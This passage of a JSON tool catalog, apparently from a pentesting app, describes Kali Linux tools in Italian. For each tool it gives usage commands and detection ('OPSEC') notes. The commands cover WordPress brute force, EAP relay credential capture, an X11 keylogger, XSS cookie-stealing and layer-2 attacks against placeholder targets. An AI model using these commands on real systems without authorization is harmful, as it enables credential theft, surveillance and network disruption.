    "category_path": [
      "01_Information_Gathering",
      "Recon",
      "Visual_Recon"
    ],
    "notes": null
  },
  {
    "id": "wordlistraider",
    "name": "wordlistraider",
    "version": "1.0~git20200927",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/wordlistraider/",
    "desc": "Combina e ottimizza wordlist multiple rimuovendo duplicati e normalizzando.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>WordlistRaider è uno strumento per combinare, ottimizzare e gestire wordlist per penetration testing. Unisce multiple wordlist rimuovendo duplicati, normalizzando contenuti e generando liste ottimizzate per specifici casi d'uso come password cracking o directory fuzzing.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Merge & Dedupe:</strong> combina wordlist multiple eliminando duplicati</p><p><strong>Normalization:</strong> standardizza encoding, case e formati</p><p><strong>Filtering:</strong> filtra per lunghezza, pattern, caratteri speciali</p><p><strong>Statistics:</strong> analizza composizione e coverage delle wordlist</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Combina wordlist\nwordlistraider -m list1.txt list2.txt -o combined.txt\n\n# Rimuovi duplicati\nwordlistraider -d input.txt -o deduped.txt\n\n# Filtra per lunghezza\nwordlistraider --min 8 --max 16 input.txt -o filtered.txt</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Wordlist Preparation</strong>, creare liste ottimizzate per specifici target o policy. Per <strong>Password Cracking</strong>, combinare wordlist tematiche per attacchi mirati. Per <strong>Efficiency</strong>, ridurre dimensione liste eliminando ridondanze.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Detection:</strong> tool offline che non genera traffico. Wordlist ottimizzate riducono tempo e rumore di attacchi brute force. Dimensione wordlist influenza durata e detectability degli attacchi.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "00_Common",
      "Wordlists"
    ],
    "notes": null
  },
  {
    "id": "wpa-sycophant",
    "name": "wpa-sycophant",
    "version": "1.0",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/wpa-sycophant/",
    "desc": "Relay per attacchi EAP su reti WPA Enterprise catturando credenziali RADIUS.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>WPA-Sycophant è uno strumento per attacchi relay su reti WPA Enterprise che utilizzano EAP. Intercetta autenticazioni EAP e le relay verso server RADIUS legittimi per catturare hash delle credenziali o ottenere accesso non autorizzato alla rete.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>EAP Relay:</strong> relay di autenticazioni EAP-MSCHAPv2 e altri metodi</p><p><strong>Credential Capture:</strong> cattura challenge/response per offline cracking</p><p><strong>Evil Twin:</strong> funziona con rogue AP per intercettare autenticazioni</p><p><strong>Hash Extraction:</strong> estrae hash NetNTLMv1/v2 da sessioni EAP</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Configura con hostapd-wpe\nwpa_sycophant -c sycophant.conf\n\n# Avvia relay\nwpa_sycophant -i wlan0 -s radius.target.com\n\n# Cattura credenziali\nwpa_sycophant -i wlan0 -o captured.txt</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>WPA Enterprise Testing</strong>, verificare sicurezza di configurazioni 802.1X. Per <strong>Credential Harvesting</strong>, catturare credenziali di dominio via WiFi. Per <strong>Network Access</strong>, ottenere accesso relay a reti enterprise.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Detection:</strong> rogue AP rilevabile da WIDS. Relay traffic può essere identificato da anomalie nei log RADIUS. Certificati fake generano warning sui client configurati correttamente. Richiede prossimità fisica.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Wireless",
      "WiFi"
    ],
    "notes": null
  },
  {
    "id": "wpscan",
    "name": "wpscan",
    "version": "3.8.28",
    "icon": "../app/icons/wpscan-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/wpscan/",
    "desc": "Scanner WordPress: enumera utenti, plugin, temi vulnerabili con database CVE.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>WPScan è lo scanner di sicurezza WordPress più completo disponibile. Enumera utenti, plugin, temi e versioni WordPress, identificando vulnerabilità note tramite database CVE integrato. Supporta brute force password e detection di configurazioni insicure.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Enumeration:</strong> identifica utenti, plugin, temi con versioni specifiche</p><p><strong>Vulnerability Database:</strong> database CVE aggiornato per WordPress ecosystem</p><p><strong>Password Attack:</strong> brute force su login WordPress con wordlist</p><p><strong>API Integration:</strong> WPScan API per vulnerability lookup in tempo reale</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Scan completo\nwpscan --url https://target.com\n\n# Enumera utenti e plugin\nwpscan --url https://target.com -e u,ap\n\n# Con API token per vuln lookup\nwpscan --url https://target.com --api-token TOKEN\n\n# Brute force password\nwpscan --url https://target.com -U users.txt -P passwords.txt</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>WordPress Security</strong>, assessment completo di installazioni WordPress. Per <strong>Plugin Audit</strong>, identificare plugin vulnerabili o outdated. Per <strong>Penetration Testing</strong>, trovare entry point in siti WordPress.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Detection:</strong> enumeration genera traffico riconoscibile nei log. Brute force può triggare lockout e alert. User-Agent WPScan è signature nota. WAF WordPress-aware bloccano scansioni aggressive.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "01_Information_Gathering",
      "Vulnerability_Scanning"
    ],
    "notes": null
  },
  {
    "id": "xplico",
    "name": "xplico",
    "version": "1.2.2",
    "icon": "../app/icons/xplico-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/xplico/",
    "desc": "Estrae dati da catture pcap: email, HTTP, VoIP, file per network forensics.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Xplico è un framework di network forensics che estrae automaticamente dati applicativi da catture di traffico. Ricostruisce email, sessioni HTTP, chiamate VoIP, file trasferiti e altre comunicazioni da file pcap per investigazioni forensi.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Protocol Decoding:</strong> supporta HTTP, SIP, IMAP, POP, FTP, SMTP e molti altri</p><p><strong>File Carving:</strong> estrae file trasferiti da sessioni di rete</p><p><strong>VoIP Reconstruction:</strong> ricostruisce chiamate audio da traffico SIP/RTP</p><p><strong>Web Interface:</strong> GUI web per gestione casi e visualizzazione risultati</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Avvia servizio web\nsudo /etc/init.d/xplico start\n\n# Accedi via browser\n# http://localhost:9876\n\n# Crea caso e carica pcap\n# tramite interfaccia web\n\n# CLI per processing\nxplico -m pcap -f capture.pcap</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Network Forensics</strong>, ricostruire attività da catture di traffico in investigazioni. Per <strong>Incident Response</strong>, analizzare comunicazioni durante security breach. Per <strong>Evidence Collection</strong>, estrarre prove da traffico intercettato legalmente.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Detection:</strong> tool di analisi offline che non genera traffico. Risultati possono contenere dati sensibili che richiedono protezione. Cattura originale deve essere preservata per chain of custody.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "05_Forensics",
      "Network_Forensics"
    ],
    "notes": null
  },
  {
    "id": "xspy",
    "name": "xspy",
    "version": "1.1",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/xspy/",
    "desc": "Keylogger per X Window System che cattura input da tutte le applicazioni GUI.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>XSpy è un keylogger per sistemi Linux con X Window System che cattura input da tastiera attraverso tutte le applicazioni GUI. Sfrutta le API X11 per intercettare eventi keyboard senza modificare le applicazioni target.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>X11 Keylogging:</strong> cattura keystroke da qualsiasi finestra X Window</p><p><strong>Window Tracking:</strong> associa input alla finestra attiva</p><p><strong>Timestamp:</strong> registra timing preciso di ogni keystroke</p><p><strong>Output Logging:</strong> salva catture su file per analisi successiva</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Avvia keylogger\nxspy\n\n# Output su file\nxspy > keylog.txt\n\n# Con display specifico\nDISPLAY=:0 xspy</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Credential Capture</strong>, catturare password digitate in sessioni X11 compromesse. Per <strong>Post-Exploitation</strong>, monitorare attività utente su sistemi Linux GUI. Per <strong>Security Testing</strong>, verificare protezioni contro keylogging X11.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Detection:</strong> processo visibile in lista processi. Wayland non è vulnerabile a questa tecnica. Accesso a X11 socket richiede privilegi appropriati. Security-focused desktop possono bloccare XTEST extension.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Credentials",
      "Dumping"
    ],
    "notes": null
  },
  {
    "id": "xsrfprobe",
    "name": "xsrfprobe",
    "version": "2.3.1",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/xsrfprobe/",
    "desc": "Scanner e exploiter CSRF automatico con detection di token e bypass tecniche.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>XSRFProbe è uno scanner CSRF avanzato che automatizza detection e exploitation di vulnerabilità Cross-Site Request Forgery. Analizza token CSRF, identifica protezioni deboli e genera PoC exploit per validare vulnerabilità trovate.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Token Analysis:</strong> analizza implementazione e robustezza di token CSRF</p><p><strong>Bypass Techniques:</strong> testa bypass comuni come token reuse, predictability, referer check</p><p><strong>PoC Generation:</strong> genera HTML exploit per validare vulnerabilità</p><p><strong>Crawling:</strong> spider automatico per trovare form e endpoint vulnerabili</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Scan singola pagina\nxsrfprobe -u https://target.com/form\n\n# Crawl e scan\nxsrfprobe -u https://target.com --crawl\n\n# Con cookie di sessione\nxsrfprobe -u https://target.com -c \"session=abc123\"\n\n# Genera PoC\nxsrfprobe -u https://target.com --poc</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>CSRF Testing</strong>, identificare form e API vulnerabili a CSRF. Per <strong>Token Analysis</strong>, validare robustezza di implementazioni anti-CSRF. Per <strong>Exploit Development</strong>, creare PoC per report di vulnerabilità.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Detection:</strong> request multiple a form sono loggate. Pattern di test possono triggare WAF. PoC exploit devono essere usati solo in ambiente controllato. Non eseguire exploit su sistemi production senza autorizzazione.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Web",
      "Injection",
      "CSRF"
    ],
    "notes": null
  },
  {
    "id": "xsser",
    "name": "xsser",
    "version": "1.8.4",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/xsser/",
    "desc": "Framework XSS automatico per detection, bypass WAF e generazione payload avanzati.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>XSSer è un framework automatizzato per detection e exploitation di vulnerabilità Cross-Site Scripting. Supporta test di XSS reflected, stored e DOM-based con tecniche avanzate di bypass WAF, encoding e generazione di payload personalizzati.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>XSS Detection:</strong> identifica reflected, stored e DOM XSS automaticamente</p><p><strong>WAF Bypass:</strong> encoding e obfuscation per evadere filtri</p><p><strong>Payload Generator:</strong> genera payload custom per scenari specifici</p><p><strong>Exploitation:</strong> cookie stealing, keylogging, phishing via XSS</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Test singolo URL\nxsser -u \"https://target.com/page?param=XSS\"\n\n# Con bypass automatico\nxsser -u \"https://target.com/page?param=XSS\" --auto\n\n# Cookie stealing payload\nxsser -u \"https://target.com/page?param=XSS\" --cookie-stealer\n\n# Crawl e test\nxsser --crawl https://target.com</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>XSS Testing</strong>, identificare vulnerabilità XSS in applicazioni web. Per <strong>WAF Testing</strong>, validare efficacia di filtri anti-XSS. Per <strong>Payload Development</strong>, creare payload per scenari di exploitation specifici.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Detection:</strong> payload XSS nei log sono facilmente identificabili. WAF moderni rilevano pattern di test. Alert XSS possono essere generati. Exploitation reale lascia tracce in log browser e server.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Web",
      "Injection",
      "XSS"
    ],
    "notes": null
  },
  {
    "id": "yara",
    "name": "yara",
    "version": "4.5.4",
    "icon": "../app/icons/yara-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/yara/",
    "desc": "Pattern matching per malware analysis: identifica sample con regole personalizzate.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>YARA è lo standard de facto per pattern matching nella malware analysis. Permette di creare regole personalizzate per identificare e classificare malware basandosi su pattern testuali e binari, condizioni logiche e metadata.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Pattern Matching:</strong> match su stringhe, hex, regex e condizioni complesse</p><p><strong>Rule Language:</strong> linguaggio espressivo per definire signature malware</p><p><strong>Module System:</strong> moduli per PE, ELF, hash, math e altre analisi</p><p><strong>Scalability:</strong> scansione veloce di grandi dataset di file</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Scan con regola\nyara rule.yar suspicious_file\n\n# Scan directory ricorsivo\nyara -r rules/ /path/to/samples/\n\n# Output solo match\nyara -w rule.yar file\n\n# Con metadata\nyara -m rule.yar file</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Malware Detection</strong>, identificare sample noti tramite signature custom. Per <strong>Threat Hunting</strong>, cercare indicatori di compromissione in filesystem. Per <strong>Incident Response</strong>, classificare malware trovato durante investigazioni.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Detection:</strong> tool di analisi che non genera traffico di rete. Regole possono essere condivise per detection collaborativa. Performance dipende da complessità regole e volume file da scansionare.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "05_Forensics",
      "Malware_Analysis"
    ],
    "notes": null
  },
  {
    "id": "yersinia",
    "name": "yersinia",
    "version": "0.8.2",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/yersinia/",
    "desc": "Attacchi layer 2: STP, CDP, DTP, DHCP, 802.1Q per VLAN hopping e network takeover.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Yersinia è un framework per attacchi Layer 2 che sfrutta debolezze nei protocolli di rete a livello data link. Supporta attacchi su STP, CDP, DTP, DHCP, HSRP, 802.1Q e altri protocolli per VLAN hopping, network takeover e DoS.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>STP Attack:</strong> diventa root bridge per intercettare traffico</p><p><strong>DTP Attack:</strong> negozia trunk per accedere a tutte le VLAN</p><p><strong>DHCP Attack:</strong> starvation e rogue DHCP per MITM</p><p><strong>CDP/LLDP:</strong> spoofing e flooding per reconnaissance e DoS</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Avvia GUI ncurses\nyersinia -I\n\n# Avvia GUI GTK\nyersinia -G\n\n# Attacco STP da CLI\nyersinia stp -attack 1 -interface eth0\n\n# DHCP starvation\nyersinia dhcp -attack 1 -interface eth0</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Network Pentesting</strong>, testare sicurezza di configurazioni switch e protocolli L2. Per <strong>VLAN Hopping</strong>, accedere a VLAN non autorizzate via DTP. Per <strong>MITM</strong>, diventare root bridge per intercettare traffico di rete.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Detection:</strong> attacchi L2 causano anomalie immediate rilevabili da network monitoring. STP topology change genera alert. DHCP starvation è molto visibile. Può causare disruption di rete significativa.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "02_Exploitation",
      "Infrastructure",
      "Network"
    ],
    "notes": null
  },
  {
    "id": "zaproxy",
    "name": "zaproxy",
    "version": "2.16.1",
    "icon": "../app/icons/zaproxy-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/zaproxy/",
    "desc": "OWASP ZAP: proxy intercettante, scanner vulnerabilità web, fuzzer e spider automatico.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>OWASP ZAP (Zed Attack Proxy) è uno degli scanner di sicurezza web più popolari e completi. Combina proxy intercettante, scanner automatico di vulnerabilità, fuzzer, spider e API per testing manuale e automatizzato di applicazioni web.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Intercepting Proxy:</strong> cattura e modifica request/response HTTP/HTTPS</p><p><strong>Active Scanner:</strong> identifica vulnerabilità automaticamente con attacchi attivi</p><p><strong>Spider:</strong> crawling automatico per mappare applicazioni web</p><p><strong>Fuzzer:</strong> testing con payload custom su parametri e endpoint</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Avvia ZAP GUI\nzaproxy\n\n# Quick scan da CLI\nzap-cli quick-scan -s all https://target.com\n\n# Spider e scan\nzap-cli spider https://target.com\nzap-cli active-scan https://target.com\n\n# Report\nzap-cli report -o report.html -f html</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Web Security Testing</strong>, assessment completo di applicazioni web. Per <strong>CI/CD Integration</strong>, scanning automatico in pipeline DevSecOps. Per <strong>Manual Testing</strong>, proxy per analisi dettagliata di funzionalità specifiche.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Detection:</strong> active scan genera traffico con pattern di attacco evidenti. Spider può triggare rate limiting. Request anomale sono loggate da WAF. Usare passive scan per ridurre rumore.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "02_Exploitation",
      "Web",
      "Proxy_MITM"
    ],
    "notes": null
  }
]